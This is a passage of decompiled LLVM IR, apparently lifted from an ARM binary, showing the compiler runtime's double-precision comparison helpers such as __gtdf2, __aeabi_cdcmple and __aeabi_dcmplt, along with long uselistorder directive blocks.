  uselistorder i32 %v6_15520, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_15518, { 1, 0 }
  uselistorder i32 %v2_15500, { 1, 0, 2 }
  uselistorder i32 %v1_15500, { 1, 0, 2 }
  uselistorder i32 %v1_154fc, { 1, 0, 2 }
  uselistorder i32 %v0_154fc, { 1, 0, 2 }
  uselistorder i1 %v7_154f0, { 1, 0 }
  uselistorder i32 %v2_154d4, { 1, 0 }
  uselistorder i32 %v3_154c0, { 2, 1, 0 }
  uselistorder i32 %v3_154b4, { 0, 2, 1 }
  uselistorder i32 %v5_154b0, { 2, 0, 1 }
  uselistorder i32 %v6_154a0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1548c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_15488, { 3, 0, 2, 1 }
  uselistorder i32 %v0_15494, { 0, 2, 1 }
  uselistorder i32 %v1_154a0, { 1, 0 }
  uselistorder i32 %v6_15484, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_15470, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1546c, { 0, 2, 1 }
  uselistorder i32 %v0_15478, { 0, 2, 1 }
  uselistorder i32 %v1_15484, { 1, 0 }
  uselistorder i32 %v6_15468, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_15454, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1545c, { 0, 2, 1 }
  uselistorder i32 %v1_15468, { 1, 0 }
  uselistorder i32 %v3_1544c, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_15440, { 1, 2, 0 }
  uselistorder i32 %v3_154c013, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_154bc17, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_15440, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1544c, { 1, 0 }
  uselistorder i32 %storemerge133, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_154e8.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1542c, { 1, 0 }
  uselistorder i32 %v0_15430, { 1, 0 }
  uselistorder i32 %v3_1541c, { 1, 0 }
  uselistorder i1 %v1_15410, { 1, 0 }
  uselistorder i32 %v3_15400, { 2, 3, 1, 0 }
  uselistorder i32 %v5_153fc, { 3, 2, 1, 0 }
  uselistorder i32 %v3_153f4, { 2, 1, 0 }
  uselistorder i32 %v5_153f0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_153d0, { 3, 1, 2, 0, 4, 7, 6, 5, 8 }
  uselistorder i32 %v6_153c0, { 2, 3, 1, 0 }
  uselistorder i32 %v5_153c0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_153bc, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_153bc, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_153b0, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r2.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 9, 10, 2, 3, 6, 4, 5, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 7, 8, 2, 4, 5, 6, 9, 3 }
  uselistorder i32* %ip.global-to-local, { 6, 7, 8, 9, 0, 1, 2, 3, 4, 5, 10 }
  uselistorder i32 (i32, i32)* @function_153a0, { 2, 1, 0 }
  uselistorder i32 ()* @function_1520c, { 1, 0 }
  uselistorder i32 1024, { 2, 0, 4, 5, 3, 6, 1, 7, 8, 9 }
  uselistorder i32 536870912, { 2, 3, 0, 4, 1 }
  uselistorder i32 16, { 1, 9, 7, 8, 10, 11, 25, 12, 13, 2, 14, 15, 73, 74, 38, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 33, 86, 28, 108, 109, 116, 118, 16, 119, 17, 87, 88, 89, 90, 91, 92, 72, 122, 123, 39, 124, 126, 143, 144, 145, 30, 29, 40, 146, 18, 147, 148, 131, 132, 133, 98, 99, 100, 101, 120, 121, 93, 94, 95, 96, 127, 128, 129, 130, 41, 117, 3, 42, 149, 150, 151, 152, 141, 34, 35, 36, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 139, 140, 134, 137, 138, 5, 4, 31, 43, 44, 45, 46, 110, 47, 111, 135, 136, 97, 48, 49, 142, 19, 50, 51, 112, 113, 52, 53, 114, 115, 102, 103, 54, 104, 55, 56, 57, 32, 125, 37, 105, 153, 106, 58, 59, 60, 61, 62, 64, 65, 155, 156, 0, 157, 158, 63, 66, 27, 20, 26, 21, 22, 6, 23, 24, 107, 67, 154, 68, 69, 70, 71 }
  uselistorder i32 8, { 0, 1, 2, 3, 4, 5, 60, 61, 33, 6, 7, 22, 8, 29, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 9, 40, 76, 39, 77, 78, 62, 79, 80, 112, 113, 120, 122, 123, 124, 125, 10, 126, 81, 82, 63, 83, 84, 85, 86, 30, 87, 52, 53, 88, 89, 90, 41, 91, 92, 93, 94, 25, 26, 95, 96, 97, 54, 128, 129, 130, 131, 132, 34, 98, 48, 49, 64, 141, 142, 143, 144, 145, 146, 147, 100, 101, 102, 103, 127, 133, 134, 135, 136, 137, 138, 139, 140, 121, 159, 160, 213, 154, 214, 42, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 148, 149, 150, 151, 152, 153, 99, 155, 31, 156, 157, 158, 114, 115, 116, 117, 118, 119, 104, 105, 106, 107, 50, 232, 233, 35, 108, 11, 162, 161, 109, 110, 32, 164, 165, 166, 167, 168, 169, 170, 171, 12, 55, 172, 173, 174, 175, 176, 177, 178, 179, 13, 180, 181, 182, 183, 14, 184, 185, 15, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 203, 196, 197, 198, 199, 56, 24, 200, 201, 202, 57, 58, 16, 204, 205, 206, 207, 209, 210, 59, 17, 211, 18, 208, 45, 46, 43, 44, 27, 28, 37, 38, 47, 234, 51, 65, 36, 19, 20, 23, 21, 111, 163, 212 }
  uselistorder i32 4, { 5, 6, 146, 210, 211, 147, 7, 8, 71, 152, 153, 154, 9, 155, 10, 156, 157, 158, 159, 160, 161, 162, 163, 164, 70, 165, 166, 167, 168, 169, 170, 212, 213, 214, 215, 216, 58, 217, 218, 226, 228, 229, 83, 230, 231, 232, 69, 233, 171, 11, 12, 100, 13, 101, 102, 103, 104, 172, 173, 14, 174, 105, 175, 176, 177, 85, 178, 179, 84, 106, 180, 181, 182, 183, 184, 185, 59, 107, 186, 188, 108, 109, 187, 148, 236, 110, 237, 238, 239, 240, 241, 242, 15, 243, 111, 86, 244, 112, 0, 1, 113, 247, 269, 270, 88, 87, 271, 114, 115, 116, 117, 272, 273, 90, 274, 89, 275, 16, 17, 2, 260, 261, 262, 194, 195, 234, 235, 189, 190, 191, 192, 193, 248, 249, 250, 251, 252, 253, 254, 255, 256, 18, 257, 258, 259, 227, 19, 276, 20, 277, 328, 264, 219, 21, 22, 208, 23, 24, 82, 77, 78, 25, 339, 79, 340, 74, 26, 27, 80, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 28, 358, 359, 360, 361, 362, 363, 73, 364, 365, 366, 367, 368, 369, 29, 30, 81, 370, 263, 91, 265, 31, 266, 92, 267, 268, 245, 246, 118, 220, 221, 222, 223, 224, 225, 32, 196, 197, 198, 199, 33, 200, 371, 119, 93, 120, 372, 34, 373, 121, 150, 151, 122, 35, 201, 123, 202, 124, 75, 203, 282, 125, 283, 284, 278, 279, 280, 281, 126, 127, 204, 128, 129, 205, 36, 206, 207, 72, 76, 287, 288, 289, 290, 291, 292, 130, 131, 37, 293, 294, 295, 296, 297, 298, 299, 300, 132, 285, 286, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 133, 134, 135, 315, 316, 319, 322, 317, 318, 94, 136, 320, 60, 321, 323, 324, 325, 327, 137, 39, 38, 326, 138, 139, 140, 338, 40, 41, 141, 61, 42, 43, 329, 330, 149, 44, 45, 62, 63, 64, 46, 47, 48, 65, 49, 50, 51, 52, 142, 53, 209, 54, 66, 55, 56, 57, 96, 95, 97, 67, 143, 98, 144, 68, 145, 331, 332, 333, 334, 335, 336, 3, 4, 337, 99 }
  uselistorder i32 32, { 71, 72, 73, 74, 21, 22, 29, 69, 70, 24, 25, 75, 23, 30, 76, 77, 78, 79, 28, 80, 81, 37, 16, 82, 83, 100, 102, 103, 84, 85, 15, 86, 0, 38, 87, 88, 89, 90, 91, 92, 17, 114, 39, 93, 115, 104, 105, 94, 95, 96, 97, 40, 108, 109, 41, 101, 117, 31, 26, 112, 110, 111, 98, 99, 113, 42, 106, 107, 34, 33, 32, 44, 48, 45, 49, 46, 50, 47, 51, 59, 60, 58, 61, 62, 63, 64, 65, 66, 53, 54, 1, 55, 2, 56, 4, 3, 52, 57, 43, 67, 116, 6, 5, 8, 7, 10, 9, 27, 12, 11, 18, 19, 14, 13, 20, 35, 36, 68 }
  uselistorder i32 33, { 2, 3, 4, 1, 5, 6, 7, 0 }
  uselistorder i32 524288, { 1, 0 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i32 16777216, { 0, 1, 3, 2, 5, 4, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 86, 15, 87, 16, 88, 17, 89, 18, 19, 20, 21, 22, 23, 24, 81, 84, 25, 26, 27, 83, 94, 28, 29, 30, 31, 32, 91, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 82, 92, 90, 93, 62, 63, 64, 80, 65, 66, 67, 0, 85, 1, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79 }
  uselistorder i32 1048576, { 20, 0, 1, 2, 21, 22, 13, 3, 4, 5, 23, 6, 7, 24, 25, 16, 17, 8, 9, 26, 27, 28, 19, 29, 10, 14, 11, 18, 12, 30, 15, 31 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32* @r6, { 29, 30, 31, 32, 104, 105, 4, 106, 107, 33, 34, 35, 36, 5, 37, 38, 39, 40, 41, 42, 43, 108, 109, 125, 126, 127, 128, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 6, 23, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 1, 71, 7, 24, 56, 0, 57, 58, 72, 73, 74, 75, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 167, 168, 169, 170, 171, 172, 173, 185, 186, 187, 199, 200, 201, 202, 9, 8, 76, 77, 78, 79, 80, 81, 203, 204, 10, 205, 206, 207, 208, 209, 210, 211, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 129, 130, 131, 132, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 110, 11, 111, 112, 12, 188, 189, 190, 13, 191, 192, 82, 83, 193, 194, 14, 195, 196, 197, 198, 158, 159, 160, 161, 162, 163, 164, 165, 166, 113, 114, 115, 116, 15, 16, 117, 118, 119, 120, 121, 122, 123, 124, 84, 85, 86, 87, 88, 89, 90, 91, 17, 18, 19, 267, 268, 269, 270, 271, 272, 2, 273, 274, 25, 20, 26, 21, 27, 265, 266, 92, 93, 94, 226, 227, 228, 229, 95, 96, 97, 98, 99, 100, 230, 234, 235, 236, 237, 231, 232, 233, 238, 239, 240, 241, 242, 22, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 258, 260, 254, 255, 256, 257, 259, 261, 101, 102, 3, 103, 262, 263, 264, 28 }
  uselistorder i32* @r5, { 47, 48, 49, 50, 51, 52, 53, 54, 55, 44, 45, 46, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 6, 78, 79, 184, 185, 186, 187, 188, 80, 0, 81, 82, 83, 84, 85, 86, 189, 190, 191, 192, 193, 194, 217, 223, 224, 225, 226, 87, 7, 88, 30, 89, 90, 91, 92, 93, 94, 95, 96, 98, 97, 99, 100, 8, 101, 102, 103, 104, 105, 106, 107, 27, 108, 109, 113, 4, 114, 1, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 33, 34, 35, 110, 111, 112, 125, 126, 127, 128, 129, 130, 227, 228, 229, 230, 231, 232, 233, 234, 2, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 9, 258, 259, 260, 261, 262, 315, 270, 271, 272, 273, 274, 275, 276, 25, 277, 278, 279, 296, 332, 333, 10, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 11, 349, 348, 28, 350, 351, 352, 353, 354, 131, 132, 133, 134, 135, 136, 137, 355, 356, 357, 358, 359, 360, 365, 366, 361, 362, 363, 364, 316, 317, 318, 319, 142, 143, 144, 145, 146, 147, 148, 149, 150, 280, 281, 282, 12, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 218, 219, 220, 221, 222, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 320, 13, 321, 322, 323, 421, 422, 423, 195, 31, 196, 3, 197, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 297, 298, 299, 300, 301, 305, 306, 307, 308, 309, 302, 303, 29, 304, 310, 311, 312, 313, 314, 198, 199, 200, 201, 139, 138, 26, 140, 141, 324, 325, 326, 327, 328, 329, 14, 330, 331, 263, 264, 265, 266, 267, 15, 268, 269, 202, 18, 203, 204, 16, 205, 206, 207, 208, 209, 210, 17, 211, 212, 213, 214, 215, 216, 151, 19, 152, 153, 154, 155, 32, 156, 20, 157, 158, 159, 160, 161, 436, 21, 437, 438, 448, 36, 37, 38, 39, 40, 41, 42, 439, 440, 441, 442, 443, 162, 163, 164, 165, 166, 167, 168, 169, 170, 379, 380, 381, 171, 172, 173, 174, 22, 23, 444, 445, 446, 447, 175, 176, 177, 178, 386, 387, 391, 392, 393, 394, 395, 388, 389, 390, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 5, 409, 410, 411, 412, 413, 24, 414, 415, 416, 417, 179, 180, 181, 182, 183, 382, 383, 384, 385, 418, 419, 420, 43 }
  uselistorder i32 %arg4, { 0, 1, 11, 10, 2, 9, 8, 3, 4, 7, 5, 6, 12 }
  uselistorder i32 %arg3, { 2, 3, 9, 8, 4, 7, 6, 0, 1, 5, 10 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %dec_label_pc_1559c, { 1, 0 }
  uselistorder label %dec_label_pc_15580, { 1, 0 }
  uselistorder label %bb110, { 1, 0 }
  uselistorder label %dec_label_pc_1554c, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1543c, { 1, 0 }
  uselistorder label %dec_label_pc_15424, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__gtdf2() local_unnamed_addr {
entry:
  store i32 -1, i32* @ip, align 4
  %v0_155c0 = call i32 @function_155d0()
  ret i32 %v0_155c0
}

define i32 @__ltdf2() local_unnamed_addr {
entry:
  store i32 1, i32* @ip, align 4
  %v0_155c8 = call i32 @function_155d0()
  ret i32 %v0_155c8

; uselistorder directives
  uselistorder i32 ()* @function_155d0, { 1, 0 }
}

define i32 @__cmpdf2() local_unnamed_addr {
entry:
  %v0_155cc = load i32, i32* @r0, align 4
  ret i32 %v0_155cc
}

define i32 @function_155d0() local_unnamed_addr {
dec_label_pc_155d0:
  %v0_155d0 = load i32, i32* @ip, align 4
  %v0_155d4 = load i32, i32* @r1, align 4
  %v2_155d4 = mul i32 %v0_155d4, 2
  %v2_155d4.off = add i32 %v2_155d4, 4194303
  %tmp = icmp ult i32 %v2_155d4.off, 2097152
  %v0_155dc = load i32, i32* @r3, align 4
  %v2_155dc = mul i32 %v0_155dc, 2
  br i1 %tmp, label %dec_label_pc_1562c, label %bb

bb:                                               ; preds = %dec_label_pc_155d0
  %v2_155dc.off = add i32 %v2_155dc, 4194303
  %tmp21 = icmp ult i32 %v2_155dc.off, 2097152
  br i1 %tmp21, label %dec_label_pc_15620, label %dec_label_pc_155e8

dec_label_pc_155e8:                               ; preds = %dec_label_pc_15634, %dec_label_pc_15640, %bb
  %v0_155e8 = load i32, i32* @r0, align 4
  %v4_155e8 = or i32 %v0_155e8, %v2_155d4
  %v6_155e8 = icmp eq i32 %v4_155e8, 0
  br i1 %v6_155e8, label %bb10, label %.thread

bb10:                                             ; preds = %dec_label_pc_155e8
  %v1_155ec = load i32, i32* @r2, align 4
  %v5_155ec = or i32 %v1_155ec, %v2_155dc
  %v7_155ec = icmp eq i32 %v5_155ec, 0
  br i1 %v7_155ec, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_155e8, %bb10
  %v5_155f0 = icmp eq i32 %v0_155dc, %v0_155d4
  br i1 %v5_155f0, label %.thread..thread1_crit_edge, label %.thread2

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_155f4.pre = load i32, i32* @r2, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb10
  %v2_155f4 = phi i32 [ %v2_155f4.pre, %.thread..thread1_crit_edge ], [ %v1_155ec, %bb10 ]
  %v5_155f4 = icmp eq i32 %v2_155f4, %v0_155e8
  br i1 %v5_155f4, label %bb11, label %.thread2

bb11:                                             ; preds = %.thread1
  store i32 0, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread, %.thread1, %bb11
  %v1_155fc = phi i1 [ false, %.thread ], [ false, %.thread1 ], [ true, %bb11 ]
  %v0_155fc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_155fc, i32 %v0_155fc)
  %v0_15600 = load i32, i32* @r0, align 4
  %v0_15604 = load i32, i32* @r1, align 4
  %v1_15604 = load i32, i32* @r3, align 4
  %v2_15604 = xor i32 %v1_15604, %v0_15604
  %v3_15604 = icmp slt i32 %v2_15604, 0
  br i1 %v3_15604, label %..thread3_crit_edge, label %bb12

bb12:                                             ; preds = %.thread2
  %v10_15608 = icmp eq i32 %v0_15604, %v1_15604
  br i1 %v10_15608, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  %v2_1560c = load i32, i32* @r2, align 4
  %v4_1560c = icmp ult i32 %v0_15600, %v2_1560c
  br i1 %v4_1560c, label %..thread3_crit_edge, label %bb15

bb14:                                             ; preds = %bb12
  %v4_15608 = icmp ult i32 %v0_15604, %v1_15604
  br i1 %v4_15608, label %..thread3_crit_edge, label %bb15

..thread3_crit_edge:                              ; preds = %bb13, %bb14, %.thread2
  %.pre8 = ashr i32 %v1_15604, 31
  br label %.thread3

bb15:                                             ; preds = %bb13, %bb14
  %v2_15610 = and i32 %v1_15604, 1073741824
  %v3_15610 = icmp eq i32 %v2_15610, 0
  %v4_15610 = ashr i32 %v1_15604, 31
  br i1 %v3_15610, label %.thread3, label %bb16

.thread3:                                         ; preds = %bb15, %..thread3_crit_edge
  %v4_15614.pre-phi = phi i32 [ %.pre8, %..thread3_crit_edge ], [ %v4_15610, %bb15 ]
  %v5_15614 = sub nsw i32 -1, %v4_15614.pre-phi
  br label %bb16

bb16:                                             ; preds = %bb15, %.thread3
  %v0_15618 = phi i32 [ %v4_15610, %bb15 ], [ %v5_15614, %.thread3 ]
  %v1_15618 = or i32 %v0_15618, 1
  ret i32 %v1_15618

dec_label_pc_15620:                               ; preds = %bb
  br label %dec_label_pc_15634

dec_label_pc_1562c:                               ; preds = %dec_label_pc_155d0
  %v0_1562c = load i32, i32* @r0, align 4
  %v4_1562c = mul i32 %v0_155d4, 4096
  %v5_1562c = or i32 %v0_1562c, %v4_1562c
  %v7_1562c = icmp eq i32 %v5_1562c, 0
  br i1 %v7_1562c, label %dec_label_pc_1562c.dec_label_pc_15634_crit_edge, label %dec_label_pc_15648

dec_label_pc_1562c.dec_label_pc_15634_crit_edge:  ; preds = %dec_label_pc_1562c
  %v2_155dc.off20 = add i32 %v2_155dc, 4194303
  %tmp22 = icmp ult i32 %v2_155dc.off20, 2097152
  br label %dec_label_pc_15634

dec_label_pc_15634:                               ; preds = %dec_label_pc_1562c.dec_label_pc_15634_crit_edge, %dec_label_pc_15620
  %v3_15638.pre-phi = phi i1 [ %tmp22, %dec_label_pc_1562c.dec_label_pc_15634_crit_edge ], [ true, %dec_label_pc_15620 ]
  br i1 %v3_15638.pre-phi, label %dec_label_pc_15640, label %dec_label_pc_155e8

dec_label_pc_15640:                               ; preds = %dec_label_pc_15634
  %v0_15640 = load i32, i32* @r2, align 4
  %v4_15640 = mul i32 %v0_155dc, 4096
  %v5_15640 = or i32 %v0_15640, %v4_15640
  %v7_15640 = icmp eq i32 %v5_15640, 0
  br i1 %v7_15640, label %dec_label_pc_155e8, label %dec_label_pc_15648

dec_label_pc_15648:                               ; preds = %dec_label_pc_1562c, %dec_label_pc_15640
  ret i32 %v0_155d0

; uselistorder directives
  uselistorder i32 %v4_15610, { 1, 0 }
  uselistorder i32 %v1_15604, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_15604, { 2, 1, 0 }
  uselistorder i32 %v1_155ec, { 1, 0 }
  uselistorder i32 %v2_155dc, { 0, 2, 1 }
  uselistorder i32 %v0_155dc, { 1, 0, 2 }
  uselistorder i32 %v2_155d4, { 1, 0 }
  uselistorder i32 %v0_155d4, { 1, 0, 2 }
  uselistorder i32 1073741824, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 31, { 9, 4, 2, 5, 6, 10, 3, 18, 11, 1, 12, 13, 14, 15, 16, 7, 8, 0, 17 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 7, 5, 6, 8, 9, 10, 11, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 43, 37, 0, 44, 45, 46, 47, 55, 56, 57, 39, 41, 61, 53, 51, 54, 52, 38, 48, 49, 50, 42, 66, 71, 69, 70, 68, 62, 63, 1, 64, 65, 67, 58, 59, 40, 60, 2, 3, 4 }
  uselistorder i32* @r3, { 14, 15, 12, 13, 16, 17, 7, 18, 19, 20, 21, 44, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 45, 33, 34, 35, 36, 37, 38, 46, 47, 48, 49, 50, 51, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 77, 2, 76, 6, 40, 55, 56, 57, 42, 43, 54, 78, 79, 58, 93, 94, 3, 95, 96, 97, 4, 98, 99, 100, 5, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 0, 119, 120, 121, 122, 59, 39, 60, 61, 62, 63, 64, 41, 123, 124, 125, 126, 129, 130, 131, 127, 52, 53, 81, 82, 88, 89, 90, 91, 92, 9, 10, 11, 135, 132, 133, 134, 1, 136, 137, 138, 128, 80, 83, 84, 85, 86, 8, 87 }
  uselistorder i32* @r1, { 29, 30, 11, 31, 32, 33, 34, 35, 12, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 25, 26, 13, 27, 28, 47, 1, 48, 49, 50, 51, 52, 53, 54, 10, 55, 56, 57, 58, 93, 14, 59, 94, 95, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 15, 96, 99, 16, 71, 72, 73, 17, 20, 74, 75, 76, 7, 77, 78, 79, 18, 80, 81, 100, 101, 102, 103, 104, 105, 108, 109, 110, 111, 112, 115, 123, 124, 125, 126, 129, 130, 131, 8, 82, 83, 132, 133, 134, 135, 136, 137, 138, 2, 116, 84, 86, 113, 114, 3, 139, 140, 141, 142, 118, 119, 120, 97, 90, 117, 121, 122, 98, 0, 85, 87, 21, 24, 148, 106, 107, 4, 5, 143, 144, 22, 127, 128, 9, 19, 6, 145, 146, 23, 88, 89, 91, 92, 147 }
  uselistorder i32* @ip, { 18, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0, 28, 55, 56, 30, 29, 4, 31, 32, 5, 33, 34, 35, 36, 57, 58, 59, 60, 61, 65, 66, 68, 37, 39, 38, 6, 41, 42, 43, 44, 45, 46, 47, 48, 40, 49, 50, 51, 52, 69, 70, 71, 72, 73, 74, 75, 83, 1, 91, 90, 100, 101, 102, 103, 104, 105, 106, 107, 108, 110, 111, 109, 112, 8, 113, 9, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 54, 84, 85, 86, 87, 88, 89, 67, 131, 132, 133, 134, 95, 96, 62, 63, 12, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 10, 174, 175, 176, 177, 178, 179, 180, 181, 182, 92, 93, 2, 94, 64, 53, 97, 98, 99, 183, 76, 77, 3, 78, 79, 80, 81, 82, 136, 11, 137, 138, 13, 135, 140, 187, 184, 185, 186, 7, 188, 139, 14 }
  uselistorder label %dec_label_pc_15648, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %..thread3_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_155e8, { 1, 0, 2 }
}

define i32 @__aeabi_cdrcmple() local_unnamed_addr {
entry:
  %v0_15650 = load i32, i32* @r0, align 4
  %v0_15654 = load i32, i32* @r2, align 4
  store i32 %v0_15654, i32* @r0, align 4
  store i32 %v0_15650, i32* @r2, align 4
  %v0_15668 = call i32 @__aeabi_cdcmple()
  ret i32 %v0_15668
}

define i32 @__aeabi_cdcmple() local_unnamed_addr {
entry:
  %v3_1566c = load i32, i32* @r0, align 4
  %v1_15670 = sext i32 %v3_1566c to i64
  %v2_15670 = bitcast i64 %v1_15670 to double
  %v3_15670 = load i32, i32* @r2, align 4
  %v4_15670 = sext i32 %v3_15670 to i64
  %v5_15670 = bitcast i64 %v4_15670 to double
  %v7_15670 = fcmp oeq double %v2_15670, %v5_15670
  store i1 true, i1* @cpsr_c, align 1
  %not.v6_15670 = fcmp ule double %v2_15670, %v5_15670
  %not.v7_15670 = xor i1 %v7_15670, true
  %v1_15674 = and i1 %not.v6_15670, %not.v7_15670
  store i1 %v7_15670, i1* @cpsr_z, align 1
  br i1 %v1_15674, label %bb, label %bb3

bb:                                               ; preds = %entry
  store i1 false, i1* @cpsr_c, align 1
  store i1 %v7_15670, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v3_1566c

; uselistorder directives
  uselistorder i1 %v7_15670, { 1, 2, 0 }
  uselistorder i32* @r2, { 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 25, 11, 26, 27, 28, 67, 68, 10, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 72, 12, 44, 45, 46, 47, 48, 49, 50, 52, 51, 53, 54, 55, 56, 57, 58, 74, 75, 76, 77, 78, 83, 93, 94, 95, 96, 97, 98, 59, 99, 100, 101, 13, 62, 73, 60, 61, 107, 81, 82, 4, 71, 102, 103, 104, 84, 65, 122, 123, 124, 85, 86, 87, 88, 89, 90, 91, 92, 14, 69, 70, 125, 126, 127, 128, 131, 132, 133, 134, 2, 146, 129, 79, 80, 5, 130, 108, 111, 112, 113, 6, 114, 115, 116, 7, 109, 110, 117, 8, 118, 66, 105, 135, 142, 143, 136, 137, 138, 139, 140, 141, 0, 1, 144, 9, 145, 63, 64, 106, 119, 120, 121 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dcmpeq(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_15688 = call i32 @__aeabi_cdcmple()
  %v0_1568c = load i1, i1* @cpsr_z, align 1
  %.v0_15688. = zext i1 %v0_1568c to i32
  ret i32 %.v0_15688.
}

define i32 @__aeabi_dcmplt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_156a0 = call i32 @__aeabi_cdcmple()
  %v0_156a4 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_156a4 to i32
  %.v0_156a0. = xor i32 %tmp2, 1
  ret i32 %.v0_156a0.
